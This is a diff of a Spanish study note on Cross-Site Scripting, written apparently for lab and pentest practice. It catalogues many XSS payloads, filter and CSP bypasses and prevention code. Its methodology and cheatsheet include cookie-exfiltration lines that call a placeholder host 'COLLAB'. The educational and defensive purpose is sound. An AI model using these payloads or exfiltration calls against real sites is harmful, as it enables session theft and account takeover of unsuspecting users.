@@ -1,26 +1,285 @@
 ---
-aliases:
+aliases: ["XSS", "Cross-Site Scripting", "Inyección de Scripts", "XSS Reflejado", "XSS Almacenado", "DOM XSS"]
 tags:
-  - hacking/web
-  - hacking/explotacion
-estado: 🟢 Terminado
+  - sec/web
+  - sec/web/cliente
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Client-Side Template Injection (CSTI)]]"
+  - "[[Cross-Site Request Forgery (CSRF)]]"
+  - "[[Clickjacking Ataques]]"
+  - "[[Prototype Pollution]]"
+  - "[[Envenenamiento de Caché Web]]"
+  - "[[Log Poisoning]]"
+  - "[[Vulnerabilidades CORS y Laboratorios]]"
+fuente: "https://portswigger.net/web-security/cross-site-scripting"
 ---
 
-Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.
+# Cross-Site Scripting (XSS)
 
-En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.
+**Cross-Site Scripting (XSS)** es la vulnerabilidad web más prevalente de la historia: el atacante consigue que el **navegador de la víctima ejecute JavaScript en el contexto de un origen legítimo**, con toda la autoridad que eso implica — leer el DOM, robar cookies y tokens, ejecutar acciones autenticadas, alterar el contenido mostrado o redirigir al usuario. No es "inyectar HTML": es **usar el navegador de la víctima como vehículo de código**, donde el navegador confía en el origen y la víctima confía en la página.
 
-Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:
+> [!info] El contrato roto
+> El navegador aplica la **Same Origin Policy** para decidir quién puede leer/escribir qué. JavaScript ejecutado *dentro* de `https://banco.com` hereda ese origin: puede leer cualquier cosa que la víctima vea (`document.cookie` si no hay `HttpOnly`, el DOM, el `localStorage`), enviar peticiones con sus cookies (`fetch(..., {credentials:'include'})`) y alterar la interfaz. XSS = tomar prestado el origin de la víctima.
 
-- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
-- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
-- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.
+Existen tres familias clásicas, distinguiéndose por **cómo llega** el payload y **dónde se ejecuta**:
 
-Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.
+- **Reflejado (Reflected)**: el payload viaja en la petición (query, body, header) y el servidor lo **devuelve reflejado** en la respuesta sin escapar. Ejecución solo si la víctima es llevada a la URL maliciosa (phishing, link). No persiste.
+- **Almacenado (Stored)**: el payload se **guarda** (BD, perfil, comentario, log) y se sirve a cada visitante/autor. El más grave: la víctima no necesita interactuar con nada raro; la página normal ya lleva el veneno. También llamado *persistent*.
+- **Basado en DOM**: el flujo completo es **client-side**: JavaScript de la propia página toma un dato controlable (URL, hash, `postMessage`, storage) y lo escribe en un *sink* peligroso (`innerHTML`, `eval`, `location`) **sin que el servidor participe**. Reflected vs Stored puede combinarse: el "DOM reflejado" llega por URL pero el daño lo hace el JS en cliente.
 
-A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:
+Un cuarto caso útil para pentesters es el **XSS ciego** (blind): no hay reflejo visible, el efecto se observa por out-of-band (collaborator, webhook) o por tiempo.
 
-- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
+> [!warning] Impacto real de XSS
+> Con ejecución JS en el origin de la víctima: robo de sesión (cookies sin `HttpOnly`, tokens en `localStorage`), robo/uso de tokens CSRF para acciones de estado, captura de credenciales con formularios falsificados, keylogging, redirección y phishing intra-origin, defacement, subida de web shells si hay funciones autenticadas, y en aplicaciones con WebSockets, exfiltración de canales internos. En apps con CSP estricta el impacto se reduce pero no desaparece (bypasses abajo).
+
+**secDevLabs** (laboratorio local de la clase): [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
+
+## Mecánica: contextos, escapes y encoding
+
+Todo XSS se reduce a una pregunta: **¿en qué contexto syntáctico cae mi dato y qué necesito para escapar de él?** El navegador (o el motor de templates) parsea la respuesta como un lenguaje anidado — HTML → atributo → JavaScript → cadena — y cada nivel tiene sus reglas de escape.
+
+| Contexto donde cae el dato | Qué necesita el payload | Payload mínimo |
+|---|---|---|
+| **HTML body** (texto de un elemento) | Cerrar la etiqueta y abrir una nueva | `<script>alert(1)</script>` o `<img src=x onerror=alert(1)>` |
+| **Atributo con comillas** (`value="..."`) | Cerrar comillas + espacio + evento | `" onmouseover="alert(1)` |
+| **Atributo sin comillas** | Espacio + evento | `x onmouseover=alert(1)` |
+| **Cadena JS con comillas simples** | Escapar comilla + romper sentencia | `';alert(1)//` |
+| **Cadena JS doble** | Igual con `"` | `";alert(1)//` |
+| **Template literal JS** | Interpolar (backticks no se escapan fácil) | `${alert(1)}` |
+| **Contexto URL** (`href`, `location`) | Esquema de script | `javascript:alert(1)` |
+| **CSS** (histórico) | `expression()` legacy / `-moz-binding` | `body{background:url('javascript:...')}` (IE6/legacy) |
+| **JSON embebido en JS** | Cerrar objeto + ejecutar | `\"};alert(1);//` (con los escapes previos del server) |
+
+**Tabla de encoding** que el atacante debe dominar (y el defensor debe aplicar al escapar):
+
+| Encoding | Ejemplo de `<` | Cuándo aparece |
+|---|---|---|
+| HTML entity | `&lt;` | Escapado de HTML body/atributo |
+| Entidad numérica | `&#60;` `&#x3c;` | Variante; decodificada antes del parse |
+| URL encoding | `%3C` | Parámetros de query/path |
+| Doble URL | `%253C` | Filtros que decodifican una sola vez |
+| JS Unicode escape | `\u003c` | Cadenas JS |
+| JS hex | `\x3c` | Cadenas JS |
+| Backslash escape | `<` | Cuando el server escapa `\` pero no comillas |
+
+> [!tip] El filtro se aplica en orden: decodificar de más a menos
+> Muchos filtros se saltan con **codificación doble o desordenada**: el filtro ve `%3Cscript%3E` (inofensivo tras su decodificación simple) y lo deja pasar; el navegador o el segundo parser lo decodifica de nuevo y ejecuta. Regla de oro: **quién codifica y cuántas veces determina quién gana** — probar variantes de encoding sistemáticamente (Burp Decoder + Repeater).
+
+### Sources y sinks de DOM XSS
+
+| **Sources** (dato controlable) | **Sinks** (destino peligroso) |
+|---|---|
+| `location`, `location.href`, `location.search`, `location.hash` | `innerHTML`, `outerHTML`, `document.write`, `document.writeln` |
+| `document.URL`, `document.referrer` | `eval()`, `setTimeout/setInterval` con string, `Function()` |
+| `window.name` | `location = ...`, `location.href = ...` |
+| `postMessage` (`e.data`) | jQuery: `$(...)` con input de usuario, `.html()`, `.attr('href')` |
+| `localStorage`, `sessionStorage`, `document.cookie` | `src`/`href` de script/iframe/img dinámicos |
+| `WebSocket`, `Server-sent events` | AngularJS/Vue expression eval |
+
+**DOM clobbering** (complemento ofensivo): inyectar HTML con `<a id=x name=y href=z>` o `<form id=x><input name=y>` **sobrescribe propiedades globales** (`window.x`, `document.getElementById('x')` → colección), engañando al JS de la página para que use valores/control de flujo que el atacante fija (lab "Exploiting DOM clobbering" abajo).
+
+## Catálogo de payloads por contexto y variante
+
+### HTML body: etiquetas que ejecutan sin interacción o con una mínima
+
+| Payload | Mecanismo |
+|---|---|
+| `<script>alert(1)</script>` | Clásico; bloqueado si se filtra `script` |
+| `<img src=x onerror=alert(1)>` | Error de carga dispara evento; el más fiable |
+| `<svg onload=alert(1)>` | Evento al renderizar SVG |
+| `<svg><animatetransform onbegin=alert(1)>` | SVG animación; evita filtros de `onload` |
+| `<marquee onstart=alert(1)>` | Legacy; evita filtros de eventos comunes |
+| `<body onscroll=alert(1)><br><br><input autofocus>` | Evento + autofocus para disparar sin click |
+| `<details open ontoggle=alert(1)>` | Toggle automático al abrir `<details>` |
+| `<input onfocus=alert(1) autofocus>` | Autofocus dispara `onfocus` |
+| `<select autofocus onfocus=alert(1)>` | Variante del anterior |
+| `<textarea autofocus onfocus=alert(1)>` | Variante |
+| `<keygen autofocus onfocus=alert(1)>` | Legacy |
+| `<video><source onerror=alert(1)>` | Error de fuente multimedia |
+| `<audio src=x onerror=alert(1)>` | Igual con audio |
+| `<iframe src=javascript:alert(1)>` | JS en el src del iframe |
+| `<object data=javascript:alert(1)>` | Variante `<object>` |
+| `<embed src=javascript:alert(1)>` | Variante `<embed>` |
+| `<isindex formaction=javascript:alert(1)>` | Legacy |
+| `<a href="javascript:alert(1)">click</a>` | Requiere click |
+| `<a onclick=alert(1) href=#>click</a>` | Click sobre anchor |
+| `<form><button formaction=javascript:alert(1)>` | formaction ejecuta JS |
+| `<math><mtext><table><mglyph><svg><mtext><animate onbegin=alert(1)>` | Mutation-style nesting; evita filtros profundos |
+| `<xss autofocus tabindex=1 onfocus=alert(1)>` | **Etiqueta custom** cuando todas las estándar están bloqueadas (lab abajo) |
+| `<custom-tag onfocus=alert(1) tabindex=1 autofocus>` | Igual: los elementos custom aceptan eventos HTML |
+
+**Variantes de encoding/evasión para etiquetas:**
+
+| Filtro | Variante |
+|---|---|
+| `script` bloqueado | `<img>`, `<svg>`, `<body>`, `<details>`, tags custom |
+| `onerror/onload` bloqueado | Otros eventos: `onmouseover`, `onfocus`+autofocus, `ontoggle`, `onbegin`, `onresize`, `onstart` |
+| Case-sensitive blacklist | `<ScRiPt>`, `<IMG SRC=x ONERROR=...>` |
+| Espacios filtrados | `%09`, `%0a`, `%0d`, `/` (`<img/src=x/onerror=alert(1)>`), comentarios `<!-- -->` |
+| `alert` bloqueado | `prompt(1)`, `confirm(1)`, `print()`, `eval(atob('...'))`, `Function('al'+'ert(1)')()` |
+| Paréntesis filtrados | `onerror=alert`1`` (backticks), `onerror=alert(document.cookie)` vía throw/onerror |
+| Entidades en atributos | `&apos;` para comillas simples cuando `'` está escapada (lab onclick) |
+
+### JavaScript string context: escape completo
+
+| Protección del server | Escape del atacante |
+|---|---|
+| Ninguna | `';alert(1)//` o `";alert(1)//` |
+| `< >` HTML-encoded | Igual — no afecta a comillas JS |
+| `'` escapada con `\` | `\'` → terminar con `\` y usar la comilla siguiente: payload `\'-alert(1)-\'` estilo o **cierre de etiqueta** `</script><script>alert(1)</script>` |
+| `\` y `'` escapados | Cerrar la etiqueta script: `</script><img src=x onerror=alert(1)>` (fuera del string, nuevo HTML) |
+| Todo escapado + backticks unicode-escaped | Interpolar template literal no escapado: `${alert(1)}` (lab abajo) |
+| Backslash escape + comillas | **Double escape**: `\';alert(1)//` — el `\` escapa al `\` del filtro y la comilla queda libre |
+
+> [!warning] El patrón del "backslash colgado"
+> Cuando el server escapa comillas añadiendo `\`, un payload terminado en `\` hace que el `\` del filtro escape al propio escape: la comilla siguiente cierra el string real y el resto es código. De ahí la familia de labs "single quote and backslash escaped" — la respuesta siempre es jugar con el balance de backslashes, o salir del contexto cerrando `</script>`.
+
+## Metodología de prueba (manual vs automatizada)
+
+1. **Localizar reflejos**: probar marcadores (`<>"'`) en todos los parámetros, cabeceras (User-Agent, Referer, Origin), cookies y paths (path-based XSS). Burp *Find in response* sobre el marcador.
+2. **Determinar el contexto** en el HTML servido: ¿dentro de texto? ¿atributo con comillas simples/dobles? ¿dentro de `<script>`? ¿en un JSON embebido? ¿en `href`?
+3. **Aplicar el payload de la tabla del contexto**, con variantes de encoding.
+4. **Blacklists**: con Intruder, fuzzear la lista de etiquetas (PortSwigger cheat sheet) y luego de eventos, identificando los permitidos por código de respuesta/reflejo, y construir el payload combinando ambos (labs "most tags blocked", "custom tags", "SVG markup allowed").
+5. **DOM XSS**: no buscar reflejos en la respuesta — inspeccionar el **código fuente JS** y DevTools *Sources*: rastrear `location.*`/`postMessage` hasta sinks. Automatizar con DOM Invader (Burp) o审计 manual.
+6. **Blind**: payload con callback (interactsh/Collaborator/XSS Hunter): `<script src=https://COLLAB/x.js></script>`, `<img src=x onerror=fetch('https://COLLAB/'+btoa(document.cookie))>`.
+7. **CSP**: si no ejecuta, leer la cabecera CSP de la respuesta — identificar directivas y si hay bypass (nonce fijo, report-uri inyectable, `unsafe-inline` en un directive equivocado). Ver sección CSP.
+
+### Detección del motor/framework para elegir payload
+
+| Señal | Vector |
+|---|---|
+| `ng-app` en `<body>`, `angular(.min).js` | AngularJS → CSTI + sandbox escapes (ver [[Client-Side Template Injection (CSTI)]]) |
+| `dompurify`, `sanitize-html` | Sanitizador — buscar versiones con bypass conocido, mXSS, `cid:` protocol |
+| `v-cloak`, `vue.runtime` | Vue — `v-html` como sink |
+| Framework con template literal moderno | `${}` interpolar |
+
+## CSP (Content Security Policy): mecánica y bypasses
+
+La CSP es la defensa de runtime contra XSS: una cabecera que dice al navegador **de dónde puede cargar/executar código**. Niveles de protección reales:
+
+| Directiva | Función | Nota |
+|---|---|---|
+| `default-src` | Fallback de todas las *-src | Base mínima |
+| `script-src` | Orígenes de scripts | La crítica para XSS |
+| `script-src-elem` | Solo elementos `<script>` | Separa ejecución inline de elementos (nivel 3) |
+| `style-src` | Hojas de estilo | Riesgo menor |
+| `object-src` | `<object>/<embed>` | `'none'` siempre |
+| `base-uri` | Base URL | `'none'` evita reescribir rutas relativas |
+| `frame-ancestors` | Framing (ver [[Clickjacking Ataques]]) | Reemplaza XFO |
+| `report-uri` / `report-to` | Reporte de violaciones | **Puede ser inyectable** (lab abajo) |
+
+| Valor | Efecto | ¿Mitiga XSS? |
+|---|---|---|
+| `'unsafe-inline'` | Permite scripts inline | **No** — anula script-src contra XSS inline |
+| `'unsafe-eval'` | Permite `eval`/`Function` | No para DOM sinks dinámicos; necesario para AngularJS 1.x templates |
+| `'nonce-<random>'` | Solo scripts con ese nonce | Sí, si el nonce es por-request e impredecible |
+| `'sha256-...'` | Solo scripts cuyo hash coincide | Sí, para scripts estáticos |
+| `'strict-dynamic'` | El nonce autoriza a los scripts dinámicos | Nivel 3; reduce errores de configuración |
+
+**Bypasses de CSP documentados en los labs:**
+1. **`report-uri`/parámetro inyectable**: la app concatena tu input en la política (p. ej. `token=`) → añadir `;script-src-elem 'unsafe-inline'` y obtener política propia (lab "with CSP bypass").
+2. **AngularJS + CSP laxa**: si CSP permite Angular (`unsafe-eval` presente) los escapes de sandbox siguen vivos.
+3. **Nonce fijo/reutilizado**: robarlo de una página pública y usarlo en tu payload.
+4. **Event handlers** permitidos si `script-src` no distingue inline (labs "event handlers and href blocked" etc.).
+5. **`'unsafe-inline'` con nonce presente**: el nonce **invalida** `'unsafe-inline'` — no cometer el error defensivo de creer que están combinados.
+
+## Impacto
+
+1. **Robo de sesión**: `document.cookie` (sin `HttpOnly`) o `localStorage` (tokens JWT) → account takeover directo. Con `HttpOnly`, exfiltrar tokens de acción (CSRF) o usar `fetch` con credenciales para acciones.
+2. **Acciones autenticadas en nombre de la víctima**: CSRF con token robado vía DOM (lab "bypass CSRF defenses").
+3. **Captura de credenciales**: formularios inyectados sobre los reales (keylogger/phishing intra-origin).
+4. **Exfiltración de contenido**: lectura del DOM de páginas internas (intranets) — "XSS para lectura cross-origin" cuando el contenido está en el mismo origin.
+5. **Worming** (historico: Samy/MySpace): stored XSS que se auto-propaga.
+6. **Cadena con caché**: XSS reflejado + [[Envenenamiento de Caché Web]] = XSS masivo.
+
+## Prevención (con código)
+
+```php
+// PHP: escape de salida CORRECTO por contexto (HTML body/atributo)
+echo htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+// ENT_QUOTES escapa también comillas — sin ellas, el atributo se rompe
+```
+
+```javascript
+// JS: textContent/setAttribute son seguros; innerHTML no
+el.textContent = userInput;                      // ✓ texto plano
+el.setAttribute('title', userInput);             // ✓ atributo saneado por el navegador
+el.innerHTML = userInput;                        // ✗ XSS directo
+
+// Si necesitas HTML de usuario: sanitiza con DOMPurify
+import DOMPurify from 'dompurify';
+el.innerHTML = DOMPurify.sanitize(userInput, { USE_PROFILES: { html: true } });
+
+// DOM XSS: nunca pasar location.* a sinks
+// ✗ document.getElementById('x').innerHTML = new URLSearchParams(location.search).get('q');
+// ✓ document.getElementById('x').textContent = new URLSearchParams(location.search).get('q');
+```
+
+```http
+# CSP por-request con nonce (sin unsafe-inline/eval)
+Content-Security-Policy: default-src 'self'; script-src 'nonce-R4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
+
+# Cookies: the trio
+Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Lax
+```
+
+Reglas de diseño:
+- **Escape por contexto en el punto de salida**, no blacklist en la entrada. Frameworks modernos (React `textContent`-by-default, Vue escaping, Angular DomSanitizer) ya lo hacen — no desactivar el escaping "porque se ve raro".
+- Templates: usar el escape automático; `v-html`/`innerHTML`/`ng-bind-html` solo con DOMPurify.
+- Sanitizadores: mantener actualizados (bypasses históricos en DOMPurify por versiones viejas, mXSS en `sanitize-html`).
+- CSP: nonce por request, sin `unsafe-inline`/`unsafe-eval`, `object-src 'none'`.
+- `HttpOnly` en cookies de sesión no elimina el XSS pero corta el robo directo.
+- Codificar salidas JSON embebidas con `\u2028/\u2029` y comillas escapadas (payloads de labs JSON).
+
+## Errores comunes
+
+**Atacante:**
+1. Probar solo `<script>alert(1)</script>` y rendirse ante un filtro — el contexto define el payload; la tabla de arriba es el camino.
+2. No mirar **dónde** cae el dato en el HTML fuente (atributo vs texto vs script) — cada uno necesita escapes distintos.
+3. Ignorar el **encoding**: un filtro se salta decodificando dos veces o usando entidades (`&apos;`).
+4. En DOM XSS, buscar reflejos en la respuesta cuando el flujo es 100% client-side — auditar JS, no el HTML servido.
+5. No verificar `HttpOnly` antes de planear robo de cookies: a veces el impacto real es CSRF/exfiltración de DOM.
+6. Olvidar la interacción mínima: `onerror`/`onload`/`autofocus` para ejecución sin click; `onmouseover` requiere víctima activa (PortSwigger simula).
+
+**Defensor (falsas soluciones):**
+1. Blacklist de etiquetas sin lista blanca (labs: se bypasea con etiquetas custom o SVG).
+2. Escapar `"` pero no `'` (o viceversa) — el atributo abierto con la otra comilla se rompe.
+3. Filtrar `script` pero dejar `onerror` en `img` — el evento es suficiente.
+4. CSP con `'unsafe-inline'` — decorativa para XSS inline.
+5. Sanitizar la entrada y volver a renderizar con `innerHTML` sin escapar (stored XSS latente).
+6. Creer que "solo es DOM, no llega al servidor" — el impacto es idéntico para la víctima.
+
+## Cheatsheet
+
+| Situación | Payload/acción |
+|---|---|
+| Texto HTML libre | `<img src=x onerror=alert(1)>` |
+| Atributo con comillas | `" onfocus=alert(1) autofocus="` |
+| Comilla simple escapada | `'-alert(1)-'` o `&apos;` |
+| Backslash + comilla | `</script><script>alert(1)` |
+| Template literal | `${alert(1)}` |
+| Filtro de etiquetas | Tag custom `<xss autofocus tabindex=1 onfocus=alert(1)>` |
+| Filtro de eventos | Fuzz con Intruder + cheat sheet de eventos |
+| SVG permitido | `<svg><animatetransform onbegin=alert(1)>` |
+| Blind | `<script src=https://COLLAB/x.js></script>` |
+| Cookie theft | `fetch('https://COLLAB/?c='+btoa(document.cookie))` |
+| Base64 para exfil | `btoa()` en JS / `base64 -d` al recibir |
+
+| Señal | Contexto |
+|---|---|
+| `<h1>` refleja tamaño | HTML body sin escapar |
+| Comillas como `&quot;` | Atributo escapado — probar eventos |
+| `'` llega como `\'` | Cadena JS — double escape o cierre de script |
+| JSON con `\"` | Escapado por JSON — cerrar estructura |
+| No aparece en respuesta | DOM XSS o blind — auditar JS / OOB |
+
+## Notas de práctica y laboratorios (verbatim)
+
+A continuación, todas las notas de laboratorio resueltos — primero el lab local (secDevLabs) y después los de PortSwigger — con sus embeds y razonamientos originales preservados:
 
 ## Notas de las Practicas
 
@@ -1210,3 +1469,22 @@ Con esto se realiza correctamente la maquina:
 ![[Pasted image 20250914223059.png]]
 
 Lab Terminado.
+
+
+## Detección (defensor)
+
+- Alertas WAF/IDS sobre `<script`, `onerror=`, `javascript:`, `<svg` en parámetros, cookies y cabeceras (`User-Agent` es un reflejo clásico).
+- CSP violaciones reportadas (`report-to`) — indican intentos de ejecución reales.
+- Auditoría de código centrada en sinks: grep de `innerHTML`, `document.write`, `eval`, `location.hash` sin pasar por escape/DOMPurify.
+- DOM Invader (Burp) o auditoría estática de JS para DOM XSS — la respuesta HTTP no muestra nada.
+- Reglas de logging: payloads de callback a dominios no propios en reflejos.
+
+## Relacionadas
+
+- [[Client-Side Template Injection (CSTI)]] — cuando el "contexto" es un motor de plantillas que evalúa expresiones
+- [[Cross-Site Request Forgery (CSRF)]] — XSS convierte cualquier CSRF en acción elegida (robo de tokens, lab "bypass CSRF defenses")
+- [[Clickjacking Ataques]] — clickjacking como delivery de un click que dispara XSS
+- [[Prototype Pollution]] — a veces habilita o potencia payloads de ejecución en frameworks JS
+- [[Envenenamiento de Caché Web]] — XSS reflejado + caché = impacto masivo
+- [[Log Poisoning]] — los logs como almacén de payloads que luego se renderizan (el patrón del primer lab de Burp)
+- [[Vulnerabilidades CORS y Laboratorios]] — política del navegador que, con XSS, permite exfiltrar cross-origin
